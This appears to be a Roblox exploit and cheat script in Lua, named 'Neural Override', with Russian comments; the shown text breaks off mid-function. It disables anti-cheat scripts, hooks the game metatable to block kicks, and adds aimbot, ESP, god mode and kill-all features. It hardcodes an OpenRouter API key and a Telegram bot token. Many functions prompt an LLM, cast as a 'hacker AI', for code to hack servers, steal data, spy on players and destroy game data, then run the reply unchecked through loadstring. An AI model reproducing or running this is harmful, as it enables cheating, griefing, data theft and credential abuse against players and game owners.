-- ================================================================
--  NEURAL OVERRIDE v8.1 – ULTIMATE FULL EDITION
--  Все функции + адаптивный чит под карту + экстра-модуль
-- ================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ===== НАСТРОЙКИ (ВАШИ) =====
local OPENROUTER_API_KEY = "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"
local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
local MODEL = "openrouter/free"

-- ===== НАСТРОЙКИ TELEGRAM =====
local TELEGRAM_BOT_TOKEN = "6543702999:AAErdz5CP5xsrm1G_RHWkAJnV4CU3GCX76M"
local TELEGRAM_CHAT_ID = "5841362765"

-- ===== НАСТРОЙКИ DISCORD =====
local DISCORD_WEBHOOK_URL = ""

-- ===== НАСТРОЙКИ АВТООБНОВЛЕНИЯ =====
local AUTO_UPDATE_INTERVAL = 60
local CURRENT_VERSION = "8.1"
local UPDATE_URL = "https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua"

-- ===== ВЕБХУК (ОБЩИЙ) =====
local webhookURL = ""

-- ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
local function sendWebhook(data)
    if webhookURL == "" then return end
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(webhookURL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

local function sendDiscordLog(message, embed)
    if DISCORD_WEBHOOK_URL == "" then return end
    local data = {
        content = message or "",
        embeds = embed and {embed} or nil
    }
    local json = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
end

local function getAllPlayers()
    local list = {}
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then table.insert(list, plr) end
    end
    return list
end

local function getCharacter(plr)
    return plr and plr.Character
end

local function getRoot(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("HumanoidRootPart")
end

local function getHumanoid(plr)
    local char = getCharacter(plr)
    return char and char:FindFirstChild("Humanoid")
end

-- ===== АНТИЧИТ (авто-отключение) =====
local function disableAntiCheat()
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") or name:find("detect") then
                v.Disabled = true
            end
        end
    end
    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("Script") or v:IsA("LocalScript") then
            local name = v.Name:lower()
            if name:find("anticheat") or name:find("security") or name:find("guard") or name:find("detect") then
                v.Disabled = true
            end
        end
    end
    print("[NeuralOverride] Античит отключён")
end
disableAntiCheat()

-- ===== OPENROUTER AI =====
local function askOpenRouter(prompt)
    local data = {
        model = MODEL,
        messages = {
            { role = "system", content = "Ты — хакерский ИИ. Отвечай только готовыми Lua-кодами для Roblox или командами, без пояснений." },
            { role = "user", content = prompt }
        },
        temperature = 0.9,
        max_tokens = 2048
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["Authorization"] = "Bearer " .. OPENROUTER_API_KEY,
        ["HTTP-Referer"] = "https://www.roblox.com",
        ["X-Title"] = "NeuralOverride"
    }
    local success, response = pcall(function()
        return HttpService:PostAsync(OPENROUTER_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    if not success then
        warn("[NeuralOverride] OpenRouter ошибка: " .. tostring(response))
        return nil
    end
    local decoded = HttpService:JSONDecode(response)
    if decoded and decoded.choices and decoded.choices[1] then
        return decoded.choices[1].message.content
    else
        return nil
    end
end

local function executeLua(code)
    local clean = string.gsub(code, "```lua", "")
    clean = string.gsub(clean, "```", "")
    local func, err = loadstring(clean)
    if func then
        local ok, res = pcall(func)
        if not ok then
            warn("[NeuralOverride] Ошибка выполнения: " .. tostring(res))
        end
        return ok
    else
        warn("[NeuralOverride] Ошибка компиляции: " .. tostring(err))
        return false
    end
end

-- ================================================================
--  БАЗОВЫЕ ЛОКАЛЬНЫЕ ФУНКЦИИ (FLY, TELEPORT, GOD, WEAPON, NOCLIP, SPEED, INFJUMP)
-- ================================================================

local flyEnabled = false
local flyBodyVelocity = nil
local flyConnection = nil

function toggleFly()
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    if flyEnabled then
        if flyBodyVelocity then flyBodyVelocity:Destroy() flyBodyVelocity = nil end
        if flyConnection then flyConnection:Disconnect() flyConnection = nil end
        humanoid.PlatformStand = false
        flyEnabled = false
        print("[NeuralOverride] Fly OFF")
    else
        humanoid.PlatformStand = true
        flyBodyVelocity = Instance.new("BodyVelocity")
        flyBodyVelocity.Velocity = Vector3.new(0,0,0)
        flyBodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
        flyBodyVelocity.Parent = root
        flyConnection = RunService.Heartbeat:Connect(function()
            local moveDir = Vector3.new(0,0,0)
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + Vector3.new(0,0,-1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir + Vector3.new(0,0,1) end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir + Vector3.new(-1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + Vector3.new(1,0,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then moveDir = moveDir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then moveDir = moveDir + Vector3.new(0,-1,0) end
            if moveDir.Magnitude > 0 then
                moveDir = moveDir.Unit * 50
                flyBodyVelocity.Velocity = moveDir
            else
                flyBodyVelocity.Velocity = Vector3.new(0,0,0)
            end
        end)
        flyEnabled = true
        print("[NeuralOverride] Fly ON")
    end
end

function teleportToPlayer(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then
        warn("[NeuralOverride] Игрок не найден")
        return
    end
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    if root and targetRoot then
        root.CFrame = targetRoot.CFrame + Vector3.new(0,3,3)
        print("[NeuralOverride] Телепорт к " .. targetName)
    end
end

local godMode = false
function toggleGod()
    local char = player.Character
    if not char then return end
    local humanoid = char:FindFirstChild("Humanoid")
    if not humanoid then return end
    godMode = not godMode
    if godMode then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        humanoid.BreakJointsOnDeath = false
        print("[NeuralOverride] God ON")
    else
        humanoid.MaxHealth = 100
        humanoid.Health = 100
        humanoid.BreakJointsOnDeath = true
        print("[NeuralOverride] God OFF")
    end
end

function spawnWeapon()
    local weaponFolder = ReplicatedStorage:FindFirstChild("Weapons") or ReplicatedStorage:FindFirstChild("Tools")
    if not weaponFolder then
        warn("[NeuralOverride] Папка с оружием не найдена")
        return
    end
    local weapons = {}
    for _, child in ipairs(weaponFolder:GetChildren()) do
        if child:IsA("Tool") or child:IsA("Model") then
            table.insert(weapons, child)
        end
    end
    if #weapons == 0 then return end
    local weapon = weapons[math.random(1, #weapons)]:Clone()
    weapon.Parent = player.Character or player
    print("[NeuralOverride] Оружие спавнено")
end

local noclipEnabled = false
function toggleNoClip()
    noclipEnabled = not noclipEnabled
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = not noclipEnabled
        end
    end
    print("[NeuralOverride] NoClip: " .. (noclipEnabled and "ON" or "OFF"))
end

function setSpeed(speed)
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if hum then
        hum.WalkSpeed = speed or 100
        print("[NeuralOverride] Speed = " .. (speed or 100))
    end
end

local infJumpEnabled = false
local infJumpConnection = nil
function toggleInfiniteJump()
    infJumpEnabled = not infJumpEnabled
    if infJumpEnabled then
        infJumpConnection = RunService.Heartbeat:Connect(function()
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
        print("[NeuralOverride] Infinite Jump ON")
    else
        if infJumpConnection then infJumpConnection:Disconnect() end
        infJumpConnection = nil
        print("[NeuralOverride] Infinite Jump OFF")
    end
end

-- ===== ESP / AIMBOT =====
local espEnabled = false
local espObjects = {}
function toggleESP()
    espEnabled = not espEnabled
    if espEnabled then
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    local box = Instance.new("BoxHandleAdornment")
                    box.Size = Vector3.new(4,6,2)
                    box.Adornee = root
                    box.Color3 = Color3.new(1,0,0)
                    box.AlwaysOnTop = true
                    box.ZIndex = 10
                    box.Parent = root
                    table.insert(espObjects, box)
                    local line = Instance.new("LineHandleAdornment")
                    line.Thickness = 2
                    line.Color3 = Color3.new(0,1,0)
                    line.AlwaysOnTop = true
                    line.ZIndex = 10
                    line.Parent = root
                    table.insert(espObjects, line)
                end
            end
        end
        print("[NeuralOverride] ESP ON")
    else
        for _, obj in ipairs(espObjects) do obj:Destroy() end
        espObjects = {}
        print("[NeuralOverride] ESP OFF")
    end
end

local aimbotEnabled = false
function toggleAimbot()
    aimbotEnabled = not aimbotEnabled
    if aimbotEnabled then
        RunService.RenderStepped:Connect(function()
            if not aimbotEnabled then return end
            local nearest = nil
            local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local root = plr.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local dist = (root.Position - Camera.CFrame.Position).Magnitude
                        if dist < minDist then
                            minDist = dist
                            nearest = root
                        end
                    end
                end
            end
            if nearest then
                Camera.CFrame = CFrame.new(Camera.CFrame.Position, nearest.Position + Vector3.new(0,1.5,0))
            end
        end)
        print("[NeuralOverride] Aimbot ON")
    else
        print("[NeuralOverride] Aimbot OFF")
    end
end

local silentAimEnabled = false
function toggleSilentAim()
    silentAimEnabled = not silentAimEnabled
    print("[NeuralOverride] Silent Aim: " .. (silentAimEnabled and "ON" or "OFF"))
end

local antiKickEnabled = false
function toggleAntiKick()
    antiKickEnabled = not antiKickEnabled
    if antiKickEnabled then
        local mt = getrawmetatable(game)
        local old = mt.__index
        setreadonly(mt, false)
        mt.__index = newcclosure(function(self, key)
            if key == "kick" then
                return function() end
            end
            return old(self, key)
        end)
        print("[NeuralOverride] Anti-Kick ON")
    else
        print("[NeuralOverride] Anti-Kick OFF")
    end
end

function setFullBright()
    Lighting.Brightness = 2
    Lighting.ClockTime = 12
    Lighting.FogEnd = 100000
    Lighting.GlobalShadows = false
    print("[NeuralOverride] FullBright ON")
end

local invisible = false
function toggleInvisible()
    invisible = not invisible
    local char = player.Character
    if not char then return end
    for _, v in ipairs(char:GetDescendants()) do
        if v:IsA("BasePart") then
            v.Transparency = invisible and 1 or 0
        end
    end
    print("[NeuralOverride] Invisible: " .. (invisible and "ON" or "OFF"))
end

local antiAfkConnection = nil
function toggleAntiAFK()
    if antiAfkConnection then
        antiAfkConnection:Disconnect()
        antiAfkConnection = nil
        print("[NeuralOverride] Anti-AFK OFF")
    else
        antiAfkConnection = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid:ChangeState(Enum.HumanoidStateType.Running)
            end
        end)
        print("[NeuralOverride] Anti-AFK ON")
    end
end

-- ===== БОТЫ И МОНСТРЫ =====
function spawnBots(count)
    count = count or 10
    local char = player.Character
    if not char then return end
    local template = char:Clone()
    for i = 1, math.min(count, 100) do
        local bot = template:Clone()
        bot.Parent = Workspace
        bot.Name = "Bot_" .. i
        local humanoid = bot:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 10 + math.random(0,30)
            humanoid.JumpPower = 50
            humanoid.MaxHealth = 100
            humanoid.Health = 100
        end
        local root = bot:FindFirstChild("HumanoidRootPart")
        if root then
            root.CFrame = CFrame.new(
                player.Character.HumanoidRootPart.Position +
                Vector3.new(math.random(-30,30),0,math.random(-30,30))
            )
        end
        task.spawn(function()
            while bot.Parent and bot:FindFirstChild("HumanoidRootPart") do
                local dir = Vector3.new(math.random(-10,10),0,math.random(-10,10))
                if dir.Magnitude > 0 then
                    bot.HumanoidRootPart.CFrame = bot.HumanoidRootPart.CFrame + dir.Unit * 2
                end
                task.wait(0.5)
            end
        end)
    end
    print("[NeuralOverride] Создано " .. count .. " ботов")
end

local MONSTER_TYPES = {
    fire = { color = "Bright red", damage = 15, speed = 35, size = 6, fly = false },
    ice = { color = "Bright blue", damage = 10, speed = 25, size = 5, fly = false },
    flying = { color = "Bright violet", damage = 20, speed = 50, size = 4, fly = true }
}

function spawnSmartMonster(pos, type)
    type = type or "fire"
    local props = MONSTER_TYPES[type] or MONSTER_TYPES.fire
    local monster = Instance.new("Model")
    monster.Name = type .. "Monster_" .. math.random(1000,9999)
    local torso = Instance.new("Part")
    torso.Size = Vector3.new(props.size, props.size, props.size)
    torso.BrickColor = BrickColor.new(props.color)
    torso.Material = Enum.Material.Neon
    torso.Anchored = false
    torso.Position = pos or Vector3.new(0,5,0)
    torso.Parent = monster
    local head = torso:Clone()
    head.Size = Vector3.new(props.size*0.6, props.size*0.6, props.size*0.6)
    head.Position = torso.Position + Vector3.new(0, props.size*0.8, 0)
    head.Parent = monster
    local root = Instance.new("Part")
    root.Size = Vector3.new(1,1,1)
    root.Transparency = 1
    root.CanCollide = false
    root.Position = torso.Position
    root.Parent = monster
    monster.PrimaryPart = root
    local w1 = Instance.new("Weld")
    w1.Part0 = root; w1.Part1 = torso; w1.C0 = CFrame.new(0,0,0); w1.Parent = root
    local w2 = Instance.new("Weld")
    w2.Part0 = torso; w2.Part1 = head; w2.C0 = CFrame.new(0, props.size*0.8, 0); w2.Parent = torso
    local humanoid = Instance.new("Humanoid")
    humanoid.Parent = monster
    humanoid.MaxHealth = 300
    humanoid.Health = 300
    humanoid.WalkSpeed = props.speed
    if props.fly then humanoid.PlatformStand = true end
    monster.Parent = Workspace
    task.spawn(function()
        while monster.Parent do
            local nearest = nil; local minDist = math.huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= player and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    if r then
                        local d = (r.Position - root.Position).Magnitude
                        if d < minDist then minDist = d; nearest = plr end
                    end
                end
            end
            if nearest and nearest.Character then
                local targetRoot = nearest.Character:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    if props.fly then
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,5,0))
                    else
                        root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(0,2,0))
                    end
                    local targetHumanoid = nearest.Character:FindFirstChild("Humanoid")
                    if targetHumanoid then
                        targetHumanoid.Health = targetHumanoid.Health - props.damage
                    end
                end
            else
                local dir = Vector3.new(math.random(-30,30),0,math.random(-30,30))
                if dir.Magnitude > 0 then
                    root.CFrame = root.CFrame + dir.Unit * 5
                end
            end
            task.wait(0.5)
        end
    end)
    return monster
end

function spawnSmartMonsters(count)
    count = count or 10
    local types = {"fire", "ice", "flying"}
    for i = 1, count do
        local t = types[math.random(1,3)]
        local pos = player.Character and
            player.Character.HumanoidRootPart.Position +
            Vector3.new(math.random(-60,60),0,math.random(-60,60)) or
            Vector3.new(0,5,0)
        spawnSmartMonster(pos, t)
        task.wait(0.1)
    end
    print("[NeuralOverride] Умные монстры созданы!")
end

-- ===== ВЗЛОМНЫЕ ФУНКЦИИ =====
function hackTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: взлом игрока/сервера '%s'. Код должен дать полный контроль.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function ddosTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для Roblox: имитация DDoS-атаки на '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealData(dataType)
    local prompt = string.format("Сгенерируй Lua-код для кражи '%s' в Roblox.", dataType)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function trackPlayer(target)
    local prompt = string.format("Сгенерируй Lua-код для слежки за игроком '%s' (позиция, чат, действия).", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spyTarget(target)
    local prompt = string.format("Сгенерируй Lua-код для шпионажа (микрофон, камера) за '%s'.", target)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function destroyData()
    local prompt = "Сгенерируй Lua-код для уничтожения всех данных в Roblox-игре (DataStore, объекты)."
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function massInvite()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который отправляет массовые приглашения на приватный сервер всем друзьям игрока. Используй :Invite() или другие методы. Если невозможно, сымитируй через спам в чате. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function summonAllPlayers()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца. Используй RemoteEvent или другие методы. Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cheatParadise()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который:
        - Даёт игроку бесконечные деньги/ресурсы (изменяет Leaderstats)
        - Удаляет все объекты в Workspace (кроме персонажей)
        - Отключает античит (ищет и отключает скрипты с "AntiCheat")
        - Включает режим "бога"
        Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    toggleGod()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Читерский рай активирован!")
end

function killAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который убивает всех игроков на сервере (устанавливает Health = 0 для каждого Humanoid). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function flyAll()
    local prompt = [[
        Сгенерируй Lua-код для Roblox, который включает полёт для всех игроков (через PlatformStand или BodyVelocity). Ответ только кодом.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createPortals(count)
    count = count or 5
    for i = 1, count do
        local portal = Instance.new("Part")
        portal.Size = Vector3.new(10,1,10)
        portal.BrickColor = BrickColor.new("Bright violet")
        portal.Material = Enum.Material.Neon
        portal.Anchored = true
        portal.CanCollide = false
        portal.Position = Vector3.new(math.random(-50,50),1,math.random(-50,50))
        portal.Parent = Workspace
        local touchScript = Instance.new("Script")
        touchScript.Source = [[
            script.Parent.Touched:Connect(function(hit)
                local humanoid = hit.Parent:FindFirstChild("Humanoid")
                if humanoid and humanoid.Parent.HumanoidRootPart then
                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
                end
            end)
        ]]
        touchScript.Parent = portal
    end
    print("[NeuralOverride] Создано " .. count .. " порталов.")
end

-- ===== ГЛОБАЛЬНЫЙ ХАОС И ТЕЛЕПОРТ ВСЕХ =====
function teleportAllToMe()
    print("[NeuralOverride] Телепортируем всех игроков к вам...")
    local prompt = [[
Сгенерируй Lua-код для Roblox, который телепортирует всех игроков (кроме владельца) к позиции владельца (player.Character.HumanoidRootPart.Position).
Используй RemoteEvent или другие методы, чтобы сделать это серверно. Если RemoteEvent'ов нет, сделай локально (меняя CFrame всех HumanoidRootPart).
Учти, что если есть античит, его нужно отключить перед телепортацией.
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Все игроки телепортированы к вам (через RemoteEvent)!")
    else
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player and plr.Character then
                local root = plr.Character:FindFirstChild("HumanoidRootPart")
                if root and player.Character then
                    root.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                end
            end
        end
        print("[NeuralOverride] Все игроки телепортированы локально.")
    end
end

function findAndExploitRemoteEvents()
    print("[NeuralOverride] Сканирование RemoteEvent'ов для глобального хаоса...")
    local remoteEvents = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remoteEvents, obj)
        end
    end
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remoteEvents, obj)
        end
    end
    if #remoteEvents == 0 then
        print("[NeuralOverride] RemoteEvent'ы не найдены. Хаос будет локальным.")
        return false
    end
    local prompt = [[
Сгенерируй Lua-код для Roblox, который вызывает все найденные RemoteEvent'ы с параметрами, чтобы сервер создал:
- 30 монстров (огромных красных существ с ИИ) в случайных местах
- 15 порталов-ловушек (Part с Touch-обработчиком)
- Изменил небо на красное
- Телепортировал всех игроков (кроме владельца) к позиции владельца
- Выключил все скрипты античита
Если RemoteEvent'ы принимают параметры, подбери их так, чтобы сервер выполнил эти действия.
Ответ только Lua-кодом без пояснений.
]]
    local code = askOpenRouter(prompt)
    if code then
        executeLua(code)
        print("[NeuralOverride] Глобальный хаос активирован через RemoteEvent'ы!")
        return true
    else
        print("[NeuralOverride] Не удалось сгенерировать код для RemoteEvent'ов.")
        return false
    end
end

function globalChaos()
    print("[NeuralOverride] Запуск глобального хаоса с телепортацией...")
    teleportAllToMe()
    task.wait(1)
    local success = findAndExploitRemoteEvents()
    if not success then
        massInvite()
        spawnSmartMonsters(30)
        createPortals(10)
        local chatPrompt = "Сгенерируй Lua-код для отправки сообщения в чат Roblox: 'ВСЕ ЗАХОДИТЕ НА МОЙ СЕРВЕР! ИГРА РУШИТСЯ!' с интервалом 1 секунда."
        local chatCode = askOpenRouter(chatPrompt)
        if chatCode then executeLua(chatCode) end
    end
    hackMapMax()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player then
            local hum = getHumanoid(plr)
            if hum then
                hum.WalkSpeed = 0
                hum.JumpPower = 0
                task.wait(5)
                hum.WalkSpeed = 16
                hum.JumpPower = 50
            end
        end
    end
    print("[NeuralOverride] Глобальный хаос завершён.")
end

function hackMapMax()
    local prompt = [[
Сгенерируй Lua-код для Roblox, который через RemoteEvent'ы:
- Удаляет все части в Workspace (кроме персонажей)
- Отключает все скрипты с "AntiCheat" в имени
- Меняет небо на красное
- Спамит сообщения "СЕРВЕР ВЗЛОМАН" всем игрокам
- Даёт всем игрокам бессмертие и супер-скорость (Humanoid.WalkSpeed=100, MaxHealth=9999)
Ответ только кодом.
]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
    Lighting.ClockTime = 0
    Lighting.OutdoorAmbient = Color3.new(1,0,0)
    Lighting.Ambient = Color3.new(1,0,0)
    Lighting.FogColor = Color3.new(1,0,0)
    Lighting.FogEnd = 50
    for _, v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("BasePart") and not v:IsA("Terrain") then
            v.Material = Enum.Material.Neon
            v.BrickColor = BrickColor.new("Bright red")
        end
    end
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = player.PlayerGui
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1,0,1,0)
    frame.BackgroundColor3 = Color3.new(1,0,0)
    frame.BackgroundTransparency = 0.7
    frame.Parent = screenGui
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,0,0.2,0)
    label.Position = UDim2.new(0,0,0.4,0)
    label.BackgroundTransparency = 1
    label.Text = "⚠️ СЕРВЕР ВЗЛОМАН ⚠️"
    label.TextColor3 = Color3.new(1,1,1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = screenGui
    game:GetService("Debris"):AddItem(screenGui,10)
    print("[NeuralOverride] HackMap MAX выполнен.")
end

function invade()
    massInvite()
    spawnSmartMonsters(30)
    hackMapMax()
    print("[NeuralOverride] Вторжение начато!")
end

function allModes()
    print("[NeuralOverride] Активация всех режимов...")
    hackMapMax()
    hackTarget("server")
    ddosTarget("server")
    stealData("все данные")
    trackPlayer("all")
    spyTarget("all")
    destroyData()
    toggleFly()
    toggleGod()
    spawnWeapon()
    spawnSmartMonsters(20)
    print("[NeuralOverride] Все режимы активированы.")
end

-- ================================================================
--  УНИКАЛЬНЫЕ ФУНКЦИИ (v6.0+)
-- ================================================================
function mindControl(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target or not target.Character then warn("Игрок не найден") return end
    local prompt = string.format([[
        Сгенерируй Lua-код, который перехватывает управление персонажем игрока '%s'.
        Сделай так, чтобы твой персонаж копировал движения цели, а ты мог управлять её персонажем через WASD.
        Используй HumanoidRootPart.CFrame и человеческий контроль.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createFakePlayer(name)
    local prompt = string.format([[
        Сгенерируй Lua-код для создания фейкового игрока с именем '%s', который будет отображаться в списке игроков.
        Он должен ходить случайным образом и реагировать на чат (отвечать случайными фразами).
        Используй Players:CreateHumanoid() или клонирование персонажа.
    ]], name)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function changeWeather(type)
    local prompt = string.format([[
        Сгенерируй Lua-код для изменения погоды на '%s'. 
        Варианты: дождь, снег, туман, буря, ясно.
        Используй Lighting, частицы (ParticleEmitter) и эффекты.
    ]], type)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function createZone()
    local prompt = [[
        Сгенерируй Lua-код для создания зоны радиусом 20 единиц вокруг игрока, в которой гравитация равна 0.1 (низкая гравитация).
        При выходе из зоны гравитация возвращается к нормальной.
        Используй BodyForce или изменение Workspace.Gravity локально.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function buildFromDescription(desc)
    local prompt = string.format([[
        Сгенерируй Lua-код, который строит объект по описанию: '%s'.
        Используй Part, BrickColor, Size, CFrame, создавай модель.
        Объект должен появиться перед игроком.
    ]], desc)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function forcePvP()
    local prompt = [[
        Сгенерируй Lua-код, который включает PvP для всех игроков на сервере (игнорируя стандартные настройки).
        Используй RemoteEvent или изменение свойства Damage.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cursePlayer(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код для наложения проклятия на игрока '%s'.
        Эффекты: случайные телепорты, изменение цвета, спам звуков, замедление.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function invertControls()
    local prompt = [[
        Сгенерируй Lua-код, который инвертирует управление для всех игроков (W↔S, A↔D).
        Используй UserInputService для перехвата и изменения векторов движения.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function scrambleInventory()
    local prompt = [[
        Сгенерируй Lua-код для перемешивания предметов в инвентарях всех игроков.
        Собери все Tool'ы из Backpack и раздай их случайным другим игрокам.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function stealPet(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код для кражи питомца у игрока '%s'. 
        Если у него есть объект с именем, содержащим "Pet", перемести его к вам.
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function fakeBan(targetName)
    local prompt = string.format([[
        Сгенерируй Lua-код, который показывает фейковое уведомление о бане для игрока '%s'.
        Используй ScreenGui с сообщением "Вас забанили за использование читов".
    ]], targetName)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function playMusicForAll(musicId)
    local prompt = string.format([[
        Сгенерируй Lua-код, который создаёт Sound в Workspace с ID '%s' и проигрывает его для всех игроков с громкостью 1.
    ]], musicId)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function notifyAll(text)
    local prompt = string.format([[
        Сгенерируй Lua-код, который отправляет системное уведомление всем игрокам с текстом: '%s'.
        Используй ScreenGui или Notification службы.
    ]], text)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function cloneWithControl()
    local prompt = [[
        Сгенерируй Lua-код, который создаёт копию вашего персонажа и позволяет управлять ею отдельно (например, через клавиши 1-4 переключение между клонами).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function possession()
    local prompt = [[
        Сгенерируй Lua-код, который позволяет вселиться в тело ближайшего игрока (захват управления его персонажем).
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function timeWarp(speed)
    local prompt = string.format([[
        Сгенерируй Lua-код для изменения скорости игры для всех (ускорение/замедление) в %s раз.
        Используй RunService и изменение временных шагов (если возможно) или просто ускорение/замедление движения всех объектов.
    ]], speed)
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

function spawnTrap()
    local prompt = [[
        Сгенерируй Lua-код для создания невидимой ловушки перед игроком: при касании она взрывается и наносит урон.
    ]]
    local code = askOpenRouter(prompt)
    if code then executeLua(code) end
end

-- ================================================================
--  ТЕРМИНАТОР, ОБХОД ЗАЩИТ, ГОЛОС, TELEGRAM
-- ================================================================

local terminatorActive = false
local terminatorLoop = nil

function toggleTerminator()
    terminatorActive = not terminatorActive
    if terminatorActive then
        print("[NeuralOverride] Терминатор активирован")
        toggleGod()
        toggleNoClip()
        setSpeed(150)
        terminatorLoop = RunService.Heartbeat:Connect(function()
            if not terminatorActive then return end
            local char = player.Character
            if not char then return end
